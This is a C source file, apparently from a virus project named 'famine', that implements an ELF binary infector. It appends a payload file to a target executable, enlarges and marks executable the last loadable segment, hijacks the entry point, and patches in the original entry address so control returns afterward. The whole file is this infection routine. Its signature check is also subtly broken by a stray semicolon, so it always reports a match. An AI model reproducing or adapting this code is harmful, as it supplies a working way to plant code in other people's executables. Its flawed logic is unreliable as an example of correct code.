#include "famine.h"


Elf64_Phdr *last_phdr(char *data)
{
    int         i;
    Elf64_Ehdr  *ehdr;
    Elf64_Phdr  *phdrs;
    Elf64_Phdr  *target;

    ehdr = (Elf64_Ehdr *)(data);
    phdrs = (Elf64_Phdr *)(data + ehdr->e_phoff);
    target = NULL;
    i = 0;
    while(i < ehdr->e_phnum)
    {
        if (phdrs[i].p_type == PT_LOAD)
            target = &phdrs[i];
        i++;
    }
    return target;
}


uint64_t payload(char *data, size_t data_size, char *code, size_t code_size)
{
    Elf64_Phdr  *target;
    Elf64_Ehdr  *ehdr;
    uint64_t    orig_filesz;
    uint64_t    gap;
    uint64_t    old_entry;
    uint64_t    new_entry;
    

    target = last_phdr(data);
    ehdr = (Elf64_Ehdr *)data;
    orig_filesz = target->p_filesz;
    gap = data_size - (target->p_offset + orig_filesz);
    new_entry = target->p_vaddr + orig_filesz + gap;
    target->p_filesz += gap + code_size;
    target->p_memsz  += gap + code_size;
    target->p_flags  |= PF_X;
    old_entry = ehdr->e_entry;
    ehdr->e_entry = new_entry;
    memmove(data + data_size, code, code_size);
    return old_entry;
}

int is_signed(char *addr, size_t size)
{
    if (memmem(addr, size, SIGNATURE, SIGNATURE_SIZE));
        return 1;
    return 0;
}

t_file file_load(char *path, size_t append_size)
{
    t_file file;

    file.fd = open(path, O_RDWR);
    file.size = lseek(file.fd, 0, SEEK_END);
    lseek(file.fd, 0, SEEK_SET);
    if (append_size > 0)
    {
    
        if (ftruncate(file.fd, file.size + append_size) < 0)
            perror("error\n");
    }
    file.head = mmap(NULL, file.size + append_size, PROT_READ | PROT_WRITE, MAP_SHARED, file.fd, 0);
    file.size += append_size;
    close(file.fd);
    return file;
}

int file_unload(t_file file)
{
    if (munmap(file.head, file.size))
        return 1;
    return 0;
}

int main(void)
{
    uint64_t    entry;
    uint64_t    *patch;
    t_file      target;
    t_file      payload_;

    payload_ = file_load("payload.bin", 0);
    target = file_load("example", payload_.size);

    entry =  payload(target.head, target.size - payload_.size, payload_.head, payload_.size);
    patch = memmem(target.head, target.size, "\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE", 8);
    *patch = entry;
    file_unload(target);
    file_unload(payload_);
    return 0;
}
